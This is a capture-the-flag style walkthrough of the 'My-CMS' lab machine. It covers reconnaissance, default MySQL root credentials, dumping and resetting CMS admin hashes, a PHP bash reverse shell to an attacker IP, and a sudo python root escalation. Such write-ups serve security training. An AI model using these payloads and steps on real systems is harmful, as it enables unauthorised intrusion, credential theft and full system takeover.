# My-CMS Walkthrough

## Target Information

* **Target IP:** `192.168.151.74`
* **Discovered CMS:** CMS Made Simple

---

## 🔍 Initial Reconnaissance

### Nmap Scan

```bash
nmap -v -sC -sV 192.168.151.74
```

### Open Ports and Services

| Port | Service | Version                                  |
| ---- | ------- | ---------------------------------------- |
| 22   | SSH     | OpenSSH 7.9p1 Debian                     |
| 80   | HTTP    | Apache 2.4.38 (CMS Made Simple detected) |
| 3306 | MySQL   | MySQL 8.0.19                             |

---

## 🛠️ Enumeration

### CMS Detected

CMS Made Simple identified via:

```text
_http-generator: CMS Made Simple - Copyright (C) 2004-2020
```

---

## 🐚 Exploiting MySQL

### Access MySQL

```bash
mysql -h 192.168.151.74 -u root -p
# Password: root
```

### Query the Database

```sql
USE database;
SHOW TABLES;

-- Dump CMS users:
SELECT username, email, password FROM cms_users;

-- Reset admin password:
UPDATE cms_users 
SET password = (SELECT MD5(CONCAT(
  IFNULL((SELECT sitepref_value 
           FROM cms_siteprefs 
           WHERE sitepref_name = 'sitemask'),''),
  'hackNos'))) 
WHERE username = 'admin';
```

---

## 📥 Reverse Shell via CMS

1. **Login to CMS** with the updated password.
2. **Navigate to** `User Defined Tags`.
3. **Insert PHP Reverse Shell Code**:

```php
system("bash -c 'bash -i >& /dev/tcp/192.168.45.215/4545 0>&1'");
```

4. **Listener on Attacker Machine**:

```bash
nc -lvnp 4545
```

5. Get a shell and read:

```bash
cat local.txt
```

---

## 🔍 Privilege Escalation Enumeration

### Run LinPEAS

Upload and run:

```bash
./linpeas.sh
```

### Found Hash in `.htpasswd`

Decryption:

```bash
echo "MFZG233VOI5FG2DJMVWGIQBRGIZQ====" | base32 -d
# Output: armour:Shield@123
```

---

## 🔐 Armour User Access

### SSH as Armour

```bash
ssh armour@192.168.151.74
# Password: Shield@123
```

---

## ⬆️ Privilege Escalation

### Check Sudo Permissions

```bash
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/python
```

### Spawn Root Shell

```bash
sudo python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🎉 Root Access Achieved

Enjoy your shell! 🎉
